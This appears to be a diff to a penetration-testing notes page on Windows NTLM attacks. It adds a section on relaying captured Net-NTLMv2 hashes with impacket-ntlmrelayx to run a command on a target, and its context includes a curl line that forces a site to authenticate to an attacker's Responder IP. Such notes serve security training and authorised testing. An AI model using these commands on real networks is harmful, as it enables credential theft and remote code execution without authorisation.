@@ -136,7 +136,30 @@ curl --path-as-is  'http://<targer>/\\<attacker_responder_ip>/a'
 
 The vulnerable website will then authenticate with the responder server and the hashes will be captured.&#x20;
 
+## Relaying Net-NTLMv2
+
+{% hint style="warning" %}
+NOTE: In order to perform pass-the-hash a local Administrator is required unless the target machine is have UAC remote restrictions disabled. Also, smb signing needs to be disable.
+{% endhint %}
+
+In a scenario that NTLM is too hard to crack, it possible to relay the net-NTLM authentication hash to the service server.
+
+In order to perform this attack, the tool `ntlmrelayx` by impacket scripts is used.\
+Starting the `ntlmrelayx` server which will capture the Net-NTLM hash and relay it to the target machine:
+
+{% code overflow="wrap" %}
+```bash
+impacket-ntlmrelayx --no-http-server -smb2support -t <target> -c "<command>"
+```
+{% endcode %}
+
+
+
 ## References
+
+{% embed url="https://en.hackndo.com/ntlm-relay/" %}
+NTLM Relay - hackndo
+{% endembed %}
 
 {% embed url="https://github.com/SpiderLabs/Responder" %}
 responder
